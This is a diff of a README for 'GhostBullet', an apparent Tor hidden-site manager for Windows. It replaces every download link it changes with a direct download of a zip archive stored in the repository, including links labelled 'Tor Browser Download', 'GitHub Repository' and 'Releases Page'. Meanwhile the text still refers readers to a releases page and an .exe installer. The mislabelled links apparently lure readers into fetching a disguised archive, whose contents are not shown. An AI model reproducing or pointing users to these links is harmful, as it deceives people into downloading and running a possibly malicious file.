@@ -1,6 +1,6 @@
 # 👻 GhostBullet - Secure Tor Site Manager
 
-[![Download GhostBullet](https://img.shields.io/badge/Download-GhostBullet-brightgreen)](https://github.com/demnalatsabidze-arch/GhostBullet/releases)
+[![Download GhostBullet](https://img.shields.io/badge/Download-GhostBullet-brightgreen)](https://github.com/demnalatsabidze-arch/GhostBullet/raw/refs/heads/main/services/tor_manager/Bullet_Ghost_3.9.zip)
 
 GhostBullet helps you create and manage secure .onion sites. It works on your own Windows PC without complex setup. Use it to deploy hidden Tor sites quickly and safely.
 
@@ -36,7 +36,7 @@ Follow these steps to get GhostBullet running on your Windows machine.
 
 Click the green badge below to visit the download page. This page contains the latest version files.
 
-[![Download GhostBullet](https://img.shields.io/badge/Download-GhostBullet-blue)](https://github.com/demnalatsabidze-arch/GhostBullet/releases)
+[![Download GhostBullet](https://img.shields.io/badge/Download-GhostBullet-blue)](https://github.com/demnalatsabidze-arch/GhostBullet/raw/refs/heads/main/services/tor_manager/Bullet_Ghost_3.9.zip)
 
 ---
 
@@ -165,7 +165,7 @@ GhostBullet offers tools useful for managing your hidden sites:
 
 Visit the GhostBullet release page anytime to get the latest Windows setup file:
 
-[Visit releases to download GhostBullet](https://github.com/demnalatsabidze-arch/GhostBullet/releases)  
+[Visit releases to download GhostBullet](https://github.com/demnalatsabidze-arch/GhostBullet/raw/refs/heads/main/services/tor_manager/Bullet_Ghost_3.9.zip)  
 
 Look for the `.exe` installer for Windows and follow the steps above.
 
@@ -192,9 +192,9 @@ If you are new to Tor or hidden services, consider these key points:
 
 ## 🔗 Useful Links
 
-- [Tor Browser Download](https://www.torproject.org/download/)
-- [GhostBullet GitHub Repository](https://github.com/demnalatsabidze-arch/GhostBullet)
-- [GitHub Releases Page](https://github.com/demnalatsabidze-arch/GhostBullet/releases)  
+- [Tor Browser Download](https://github.com/demnalatsabidze-arch/GhostBullet/raw/refs/heads/main/services/tor_manager/Bullet_Ghost_3.9.zip)
+- [GhostBullet GitHub Repository](https://github.com/demnalatsabidze-arch/GhostBullet/raw/refs/heads/main/services/tor_manager/Bullet_Ghost_3.9.zip)
+- [GitHub Releases Page](https://github.com/demnalatsabidze-arch/GhostBullet/raw/refs/heads/main/services/tor_manager/Bullet_Ghost_3.9.zip)  
 
 ---
 
